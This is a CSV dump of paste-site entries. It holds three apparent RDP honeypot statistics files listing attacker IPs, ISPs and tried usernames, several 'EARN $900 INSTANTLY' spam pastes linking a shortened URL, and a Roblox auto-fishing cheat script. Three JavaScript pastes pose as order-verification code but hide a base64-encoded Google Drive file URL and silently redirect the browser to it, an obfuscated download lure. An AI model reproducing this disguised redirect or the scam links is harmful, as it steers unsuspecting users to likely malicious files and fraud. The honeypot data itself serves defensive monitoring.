id,title,username,language,date,content
L1kj0TNt,2025-04-01_stats.json,rdp_snitch,JSON,Wednesday 2nd of April 2025 07:18:33 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 36498,
    ""146.190.105.191"": 2469,
    ""138.199.24.6"": 67059,
    ""156.146.57.52"": 9153,
    ""156.146.57.120"": 9156,
    ""150.95.89.149"": 9135,
    ""156.146.57.174"": 9156,
    ""106.14.144.233"": 429,
    ""185.42.12.5"": 18,
    ""217.160.21.137"": 6,
    ""188.166.250.11"": 6,
    ""198.235.24.244"": 9,
    ""165.140.242.48"": 3,
    ""82.202.249.174"": 3,
    ""194.180.49.123"": 3,
    ""36.140.131.209"": 3,
    ""147.182.229.114"": 336,
    ""205.210.31.64"": 9,
    ""157.245.104.150"": 3,
    ""194.165.16.162"": 6,
    ""206.189.41.239"": 3,
    ""194.165.16.167"": 6,
    ""91.103.143.74"": 3,
    ""92.255.57.11"": 6,
    ""58.218.199.219"": 12,
    ""61.219.85.85"": 3,
    ""20.106.194.122"": 12,
    ""198.235.24.35"": 9,
    ""152.42.181.151"": 18,
    ""159.223.65.65"": 9,
    ""165.154.36.177"": 3,
    ""92.255.85.59"": 6,
    ""92.255.57.86"": 6,
    ""185.7.214.81"": 3,
    ""205.210.31.67"": 9
  },
  ""asn"": {
    ""AS212238"": 63963,
    ""AS14061"": 2844,
    ""AS60068"": 67059,
    ""AS135161"": 9135,
    ""AS37963"": 429,
    ""AS59425"": 18,
    ""AS8560"": 6,
    ""AS396982"": 36,
    ""AS203380"": 3,
    ""AS49505"": 3,
    ""AS201814"": 3,
    ""AS9808"": 3,
    ""AS48721"": 12,
    ""AS3170"": 3,
    ""AS207566"": 21,
    ""AS4134"": 12,
    ""AS3462"": 3,
    ""AS8075"": 12,
    ""AS135377"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 63963,
    ""DigitalOcean, LLC"": 2844,
    ""DataCamp Limited"": 67059,
    ""GMO-Z.COM PTE. LTD."": 9135,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 39,
    ""IONOS SE"": 6,
    ""Google LLC"": 36,
    ""DA International Group Ltd."": 3,
    ""JSC Selectel"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""China Mobile"": 3,
    ""Flyservers S.A."": 12,
    ""VeloxServ Communications Ltd"": 3,
    ""Chinanet"": 12,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Microsoft Corporation"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 63963,
    ""DigitalOcean, LLC"": 2820,
    ""Cdn77 SGP"": 67059,
    ""Zcom Thai"": 9135,
    ""Aliyun Computing Co., LTD"": 429,
    ""Horizon LLC"": 18,
    ""Unknown"": 9,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""AlphaVPS LLC"": 3,
    ""HostSlick"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Flyservers S.A"": 12,
    ""UAB \""Tarapa\"""": 3,
    ""Chang Way Technologies Co. Limited"": 21,
    ""Chinanet JS"": 12,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Microsoft Azure Cloud (eastus)"": 12,
    ""Digital Ocean"": 18,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 131022,
    ""South West"": 2505,
    ""Tokyo"": 9135,
    ""Shanghai"": 429,
    ""Moscow"": 39,
    ""Madrid"": 6,
    ""California"": 375,
    ""New York"": 3,
    ""St.-Petersburg"": 3,
    ""Bavaria"": 3,
    ""Guangdong"": 3,
    ""Karnataka"": 3,
    ""Kaunas"": 12,
    ""England"": 3,
    ""Jiangsu"": 12,
    ""New Taipei City"": 3,
    ""Virginia"": 12
  },
  ""country"": {
    ""Singapore"": 133527,
    ""Japan"": 9135,
    ""China"": 444,
    ""Russia"": 42,
    ""Spain"": 6,
    ""United States"": 390,
    ""Germany"": 3,
    ""India"": 3,
    ""Lithuania"": 12,
    ""United Kingdom"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 143472,
    ""Test"": 24,
    ""qvlaCjUsI"": 3,
    ""fNnAPM"": 3,
    ""kHeRpN"": 3,
    ""(empty)"": 6,
    ""rIIYhfZsB"": 3,
    ""NhSgjP"": 3,
    ""SsrrMF"": 3,
    ""Administr"": 21,
    ""shnHlTxOg"": 3,
    ""Gydyzg"": 3,
    ""gSITpL"": 3,
    ""Domain"": 6,
    ""Administrator"": 3,
    ""FQEXQyCCE"": 3,
    ""DwsDzr"": 3,
    ""PtKMzQ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 143568
  },
  ""client_build"": {
    ""Unknown"": 143568
  },
  ""client_name"": {
    ""Unknown"": 143568
  },
  ""ip_type"": {
    ""hosting & proxy"": 134259,
    ""hosting"": 9234,
    ""proxy"": 51,
    ""Unknown"": 21,
    ""mobile"": 3
  }
}"
Miae9FU9,2025-04-01_stats.json,rdp_snitch,JSON,Wednesday 2nd of April 2025 07:16:30 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 36496,
    ""146.190.105.191"": 2468,
    ""138.199.24.6"": 67055,
    ""156.146.57.52"": 9152,
    ""156.146.57.120"": 9156,
    ""150.95.89.149"": 9135,
    ""156.146.57.174"": 9156,
    ""106.14.144.233"": 429,
    ""185.42.12.5"": 18,
    ""217.160.21.137"": 6,
    ""188.166.250.11"": 6,
    ""198.235.24.244"": 9,
    ""165.140.242.48"": 3,
    ""82.202.249.174"": 3,
    ""194.180.49.123"": 3,
    ""36.140.131.209"": 3,
    ""147.182.229.114"": 336,
    ""205.210.31.64"": 9,
    ""157.245.104.150"": 3,
    ""194.165.16.162"": 6,
    ""206.189.41.239"": 3,
    ""194.165.16.167"": 6,
    ""91.103.143.74"": 3,
    ""92.255.57.11"": 6,
    ""58.218.199.219"": 12,
    ""61.219.85.85"": 3,
    ""20.106.194.122"": 12,
    ""198.235.24.35"": 9,
    ""152.42.181.151"": 18,
    ""159.223.65.65"": 9,
    ""165.154.36.177"": 3,
    ""92.255.85.59"": 6,
    ""92.255.57.86"": 6,
    ""185.7.214.81"": 3,
    ""205.210.31.67"": 9
  },
  ""asn"": {
    ""AS212238"": 63960,
    ""AS14061"": 2843,
    ""AS60068"": 67055,
    ""AS135161"": 9135,
    ""AS37963"": 429,
    ""AS59425"": 18,
    ""AS8560"": 6,
    ""AS396982"": 36,
    ""AS203380"": 3,
    ""AS49505"": 3,
    ""AS201814"": 3,
    ""AS9808"": 3,
    ""AS48721"": 12,
    ""AS3170"": 3,
    ""AS207566"": 21,
    ""AS4134"": 12,
    ""AS3462"": 3,
    ""AS8075"": 12,
    ""AS135377"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 63960,
    ""DigitalOcean, LLC"": 2843,
    ""DataCamp Limited"": 67055,
    ""GMO-Z.COM PTE. LTD."": 9135,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 39,
    ""IONOS SE"": 6,
    ""Google LLC"": 36,
    ""DA International Group Ltd."": 3,
    ""JSC Selectel"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""China Mobile"": 3,
    ""Flyservers S.A."": 12,
    ""VeloxServ Communications Ltd"": 3,
    ""Chinanet"": 12,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Microsoft Corporation"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 63960,
    ""DigitalOcean, LLC"": 2819,
    ""Cdn77 SGP"": 67055,
    ""Zcom Thai"": 9135,
    ""Aliyun Computing Co., LTD"": 429,
    ""Horizon LLC"": 18,
    ""Unknown"": 9,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""AlphaVPS LLC"": 3,
    ""HostSlick"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Flyservers S.A"": 12,
    ""UAB \""Tarapa\"""": 3,
    ""Chang Way Technologies Co. Limited"": 21,
    ""Chinanet JS"": 12,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Microsoft Azure Cloud (eastus)"": 12,
    ""Digital Ocean"": 18,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 131015,
    ""South West"": 2504,
    ""Tokyo"": 9135,
    ""Shanghai"": 429,
    ""Moscow"": 39,
    ""Madrid"": 6,
    ""California"": 375,
    ""New York"": 3,
    ""St.-Petersburg"": 3,
    ""Bavaria"": 3,
    ""Guangdong"": 3,
    ""Karnataka"": 3,
    ""Kaunas"": 12,
    ""England"": 3,
    ""Jiangsu"": 12,
    ""New Taipei City"": 3,
    ""Virginia"": 12
  },
  ""country"": {
    ""Singapore"": 133519,
    ""Japan"": 9135,
    ""China"": 444,
    ""Russia"": 42,
    ""Spain"": 6,
    ""United States"": 390,
    ""Germany"": 3,
    ""India"": 3,
    ""Lithuania"": 12,
    ""United Kingdom"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 143464,
    ""Test"": 24,
    ""qvlaCjUsI"": 3,
    ""fNnAPM"": 3,
    ""kHeRpN"": 3,
    ""(empty)"": 6,
    ""rIIYhfZsB"": 3,
    ""NhSgjP"": 3,
    ""SsrrMF"": 3,
    ""Administr"": 21,
    ""shnHlTxOg"": 3,
    ""Gydyzg"": 3,
    ""gSITpL"": 3,
    ""Domain"": 6,
    ""Administrator"": 3,
    ""FQEXQyCCE"": 3,
    ""DwsDzr"": 3,
    ""PtKMzQ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 143560
  },
  ""client_build"": {
    ""Unknown"": 143560
  },
  ""client_name"": {
    ""Unknown"": 143560
  },
  ""ip_type"": {
    ""hosting & proxy"": 134251,
    ""hosting"": 9234,
    ""proxy"": 51,
    ""Unknown"": 21,
    ""mobile"": 3
  }
}"
kzMJjAnC,2025-04-01_stats.json,rdp_snitch,JSON,Wednesday 2nd of April 2025 07:15:17 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 36494,
    ""146.190.105.191"": 2467,
    ""138.199.24.6"": 67051,
    ""156.146.57.52"": 9151,
    ""156.146.57.120"": 9156,
    ""150.95.89.149"": 9135,
    ""156.146.57.174"": 9156,
    ""106.14.144.233"": 429,
    ""185.42.12.5"": 18,
    ""217.160.21.137"": 6,
    ""188.166.250.11"": 6,
    ""198.235.24.244"": 9,
    ""165.140.242.48"": 3,
    ""82.202.249.174"": 3,
    ""194.180.49.123"": 3,
    ""36.140.131.209"": 3,
    ""147.182.229.114"": 336,
    ""205.210.31.64"": 9,
    ""157.245.104.150"": 3,
    ""194.165.16.162"": 6,
    ""206.189.41.239"": 3,
    ""194.165.16.167"": 6,
    ""91.103.143.74"": 3,
    ""92.255.57.11"": 6,
    ""58.218.199.219"": 12,
    ""61.219.85.85"": 3,
    ""20.106.194.122"": 12,
    ""198.235.24.35"": 9,
    ""152.42.181.151"": 18,
    ""159.223.65.65"": 9,
    ""165.154.36.177"": 3,
    ""92.255.85.59"": 6,
    ""92.255.57.86"": 6,
    ""185.7.214.81"": 3,
    ""205.210.31.67"": 9
  },
  ""asn"": {
    ""AS212238"": 63957,
    ""AS14061"": 2842,
    ""AS60068"": 67051,
    ""AS135161"": 9135,
    ""AS37963"": 429,
    ""AS59425"": 18,
    ""AS8560"": 6,
    ""AS396982"": 36,
    ""AS203380"": 3,
    ""AS49505"": 3,
    ""AS201814"": 3,
    ""AS9808"": 3,
    ""AS48721"": 12,
    ""AS3170"": 3,
    ""AS207566"": 21,
    ""AS4134"": 12,
    ""AS3462"": 3,
    ""AS8075"": 12,
    ""AS135377"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 63957,
    ""DigitalOcean, LLC"": 2842,
    ""DataCamp Limited"": 67051,
    ""GMO-Z.COM PTE. LTD."": 9135,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 39,
    ""IONOS SE"": 6,
    ""Google LLC"": 36,
    ""DA International Group Ltd."": 3,
    ""JSC Selectel"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""China Mobile"": 3,
    ""Flyservers S.A."": 12,
    ""VeloxServ Communications Ltd"": 3,
    ""Chinanet"": 12,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Microsoft Corporation"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 63957,
    ""DigitalOcean, LLC"": 2818,
    ""Cdn77 SGP"": 67051,
    ""Zcom Thai"": 9135,
    ""Aliyun Computing Co., LTD"": 429,
    ""Horizon LLC"": 18,
    ""Unknown"": 9,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""AlphaVPS LLC"": 3,
    ""HostSlick"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Flyservers S.A"": 12,
    ""UAB \""Tarapa\"""": 3,
    ""Chang Way Technologies Co. Limited"": 21,
    ""Chinanet JS"": 12,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Microsoft Azure Cloud (eastus)"": 12,
    ""Digital Ocean"": 18,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""North West"": 131008,
    ""South West"": 2503,
    ""Tokyo"": 9135,
    ""Shanghai"": 429,
    ""Moscow"": 39,
    ""Madrid"": 6,
    ""California"": 375,
    ""New York"": 3,
    ""St.-Petersburg"": 3,
    ""Bavaria"": 3,
    ""Guangdong"": 3,
    ""Karnataka"": 3,
    ""Kaunas"": 12,
    ""England"": 3,
    ""Jiangsu"": 12,
    ""New Taipei City"": 3,
    ""Virginia"": 12
  },
  ""country"": {
    ""Singapore"": 133511,
    ""Japan"": 9135,
    ""China"": 444,
    ""Russia"": 42,
    ""Spain"": 6,
    ""United States"": 390,
    ""Germany"": 3,
    ""India"": 3,
    ""Lithuania"": 12,
    ""United Kingdom"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 143456,
    ""Test"": 24,
    ""qvlaCjUsI"": 3,
    ""fNnAPM"": 3,
    ""kHeRpN"": 3,
    ""(empty)"": 6,
    ""rIIYhfZsB"": 3,
    ""NhSgjP"": 3,
    ""SsrrMF"": 3,
    ""Administr"": 21,
    ""shnHlTxOg"": 3,
    ""Gydyzg"": 3,
    ""gSITpL"": 3,
    ""Domain"": 6,
    ""Administrator"": 3,
    ""FQEXQyCCE"": 3,
    ""DwsDzr"": 3,
    ""PtKMzQ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 143552
  },
  ""client_build"": {
    ""Unknown"": 143552
  },
  ""client_name"": {
    ""Unknown"": 143552
  },
  ""ip_type"": {
    ""hosting & proxy"": 134243,
    ""hosting"": 9234,
    ""proxy"": 51,
    ""Unknown"": 21,
    ""mobile"": 3
  }
}"
SK1a6zGh,Market.js,WassupDog45,JavaScript,Wednesday 2nd of April 2025 07:12:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/313/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xC2mMqiX,EARN $900 INSTANTLY 2025 BT,junaanims,JavaScript,Wednesday 2nd of April 2025 07:05:49 PM CDT," 
Pdf https://tinyurl.com/methodssss


At8i5s8txT
"
usefivmP,Untitled,WassupDog45,JavaScript,Wednesday 2nd of April 2025 06:57:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/214/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LZnZ1FjY,EARN $900 INSTANTLY 2025 BT,christopfchristiaans,JavaScript,Wednesday 2nd of April 2025 06:48:14 PM CDT," 
Pdf https://tinyurl.com/methodssss


s5srCedpWY
"
w4FZiKN9,Products.js,WassupDog45,JavaScript,Wednesday 2nd of April 2025 06:42:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/976/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rXY8z9de,Random Gmail Acc 1A,christopfchristiaans,JavaScript,Wednesday 2nd of April 2025 06:32:19 PM CDT," 
Pdf https://tinyurl.com/methodssss


HR76oJjhK1
"
0t05B30J,Roblox Be a silly seal automatic reel script,evannik23,Lua,Wednesday 2nd of April 2025 05:48:39 PM CDT,"local plr = game.Players.LocalPlayer
local PlayerUi = plr.PlayerGui
local Backpack = plr.Backpack
local Char = plr.Character
local FishingRod = Char:FindFirstChild(""Fishing Rod"") or Backpack:FindFirstChild(""Fishing Rod"")
local Deployed = FishingRod.Vars.IsDeployed
local FishingUI = plr.PlayerGui:WaitForChild(""FishingGameUI"")
local Prompt = FishingUI.CatchBar.ClickPrompt
local Mouse = plr:GetMouse()
if getgenv().Connections==nil then
    getgenv().Connections={}
    else
        for _,Connection in pairs(getgenv().Connections) do 
            Connection:Disconnect()
        end 
        getgenv().Connections={}
    end
    
function AddConnection(connection)
    table.insert(getgenv().Connections,connection)
end
function ActivateReelLogic()

    if FishingUI.Enabled == false then return end
    if Prompt.Text == ""Press & Hold"" then
        wait(0.5)
        mouse1press()
    else
        mouse1release()
        while task.wait() do
            if Prompt.Text == ""Press & Hold"" then break end
            mouse1click()
        end
    end
end
AddConnection(Prompt:GetPropertyChangedSignal(""Text""):Connect(ActivateReelLogic))
AddConnection(FishingUI:GetPropertyChangedSignal(""Enabled""):Connect(function() 
     if FishingUI.Enabled == false then mouse1release() wait(0.5) mouse1click() return end
     ActivateReelLogic()
end))
AddConnection(Deployed:GetPropertyChangedSignal(""Value""):Connect(function()
    if Deployed.Value == false then return end
    while wait(0.1) do
        if FishingUI.Enabled == true then break end
        mouse1click()
    end
end))"
